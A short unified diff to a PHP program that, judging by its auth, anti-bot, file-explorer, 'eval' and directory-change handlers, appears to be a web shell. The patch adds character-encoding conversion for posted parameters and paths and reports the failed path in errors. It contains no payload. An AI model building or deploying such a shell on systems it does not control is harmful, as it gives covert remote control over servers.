@@ -4,7 +4,14 @@ block_bot();
 auth();
 chdir(get_cwd());
 $nav = get_nav(get_cwd());
-$p = array_map("rawurldecode", get_post());
+function array_map_cb($e) {
+    $e = rawurldecode($e);
+    if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
+        $e = convert_encode('utf-8', $GLOBALS['encode'], $e);
+    }
+    return $e;
+}
+$p = array_map("array_map_cb", get_post());
 $cwd = html_safe(get_cwd());
 $GLOBALS['module'] = array();
 
@@ -38,6 +45,8 @@ $GLOBALS['module']['explorer']['id'] = "explorer";
 $GLOBALS['module']['explorer']['title'] = "Explorer";
 $GLOBALS['module']['explorer']['js_ontabselected'] = "";
 if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
+    $nav = convert_encode($GLOBALS['encode'], 'utf-8', $nav);
+    $cwd = convert_encode($GLOBALS['encode'], 'utf-8', $cwd);
     $explorer_content = convert_encode($GLOBALS['encode'], 'utf-8', $explorer_content);
 }
 $GLOBALS['module']['explorer']['content'] = $explorer_content;
@@ -85,6 +94,7 @@ $GLOBALS['module']['eval']['content'] = "
 $res = "";
 if(isset($p['cd'])){
 	$path = $p['cd'];
+	$path_param = $path;
 	if(trim($path)=='') $path = dirname(__FILE__);
 
 	$path = realpath($path);
@@ -98,7 +108,7 @@ if(isset($p['cd'])){
 			$res .= show_all_files($path);
 		}
 	}
-	else $res = "error";
+	else $res = "error|".$path_param;
 	output($res);
 }
 elseif(isset($p['viewFile']) && isset($p['viewType'])){
